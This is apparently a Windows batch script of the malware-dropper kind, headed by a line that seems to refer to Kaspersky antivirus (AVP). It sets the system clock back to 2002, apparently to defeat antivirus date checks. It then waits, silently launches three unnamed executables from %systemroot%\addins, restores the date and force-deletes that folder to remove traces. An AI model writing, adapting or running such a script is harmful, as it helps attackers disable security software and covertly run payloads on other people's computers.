wwwwavpavpwwww
set date=%date%
date 2002-1-1
@echo off & setlocal enableextensions
echo WScript.Sleep 1000 > fyzero.vbs
set /a i = 10
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo fyzero.vbs
goto Timeout
goto End
:Next
%systemroot%\addins\1.exe
%systemroot%\addins\2.exe
%systemroot%\addins\3.exe
date %date%
RD /S /Q %systemroot%\addins\